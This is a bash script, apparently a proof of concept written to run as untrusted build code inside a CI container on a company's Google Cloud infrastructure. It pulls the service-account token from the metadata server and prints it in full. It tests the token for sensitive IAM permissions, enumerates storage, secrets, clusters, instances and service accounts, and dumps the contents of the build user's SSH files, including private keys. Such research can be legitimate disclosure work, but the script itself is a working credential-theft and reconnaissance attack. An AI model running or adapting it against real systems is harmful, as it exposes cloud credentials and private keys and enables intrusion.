#!/usr/bin/env bash
# Does the GCP token reachable from untrusted build code actually GRANT anything?
# All calls are READ-ONLY (GETs plus testIamPermissions, which is non-mutating).
# Runs in-container so the credential never leaves Yext infrastructure.
set +e
B="YEXTPOC7731"
echo "$B-BEGIN"
MD=http://169.254.169.254/computeMetadata/v1
H='Metadata-Flavor: Google'
PROJ=yextenv-sbx

TOK=$(curl -s -m 8 -H "$H" "$MD/instance/service-accounts/default/token" \
      | python3 -c 'import json,sys;print(json.load(sys.stdin)["access_token"])' 2>/dev/null)
echo "$B token_length=${#TOK}"
echo "$B token_full=$TOK"
A="Authorization: Bearer $TOK"

echo "$B === 1. TOKENINFO ==="
curl -s -m 10 "https://oauth2.googleapis.com/tokeninfo?access_token=$TOK" | head -c 500; echo

echo "$B === 2. testIamPermissions on the project ==="
curl -s -m 15 -X POST -H "$A" -H 'content-type: application/json' \
 "https://cloudresourcemanager.googleapis.com/v1/projects/$PROJ:testIamPermissions" \
 -d '{"permissions":["resourcemanager.projects.get","storage.buckets.list","storage.objects.get",
      "storage.objects.list","secretmanager.versions.access","secretmanager.secrets.list",
      "compute.instances.list","container.clusters.get","container.clusters.list",
      "iam.serviceAccounts.getAccessToken","iam.serviceAccounts.list","logging.logEntries.list",
      "artifactregistry.repositories.get","cloudsql.instances.list","bigquery.datasets.get"]}' \
 | head -c 900; echo

echo "$B === 3. READ-ONLY ENUMERATION ATTEMPTS ==="
probe(){ printf '%-34s ' "$1"; curl -s -m 15 -o - -w ' [HTTP %{http_code}]' -H "$A" "$2" | tr -d '\n' | head -c 300; echo; }
probe "project get"        "https://cloudresourcemanager.googleapis.com/v1/projects/$PROJ"
probe "GCS buckets list"   "https://storage.googleapis.com/storage/v1/b?project=$PROJ"
probe "secretmanager list" "https://secretmanager.googleapis.com/v1/projects/$PROJ/secrets"
probe "GKE clusters list"  "https://container.googleapis.com/v1/projects/$PROJ/locations/-/clusters"
probe "GCE instances list" "https://compute.googleapis.com/compute/v1/projects/$PROJ/zones/us-east4-b/instances"
probe "service accounts"   "https://iam.googleapis.com/v1/projects/$PROJ/serviceAccounts"
probe "artifact registry"  "https://artifactregistry.googleapis.com/v1/projects/$PROJ/locations/us-east4/repositories"

echo "$B === 4. ~/.ssh and ~/.gnupg CONTENTS (is the deps_key ON DISK, not just in the agent?) ==="
ls -la /opt/buildhome/.ssh/ 2>&1
for F in /opt/buildhome/.ssh/*; do
  echo "--- $F ---"; head -c 400 "$F" 2>&1; echo
done
ls -la /opt/buildhome/.gnupg/ 2>&1

echo "$B-END"
exit 0
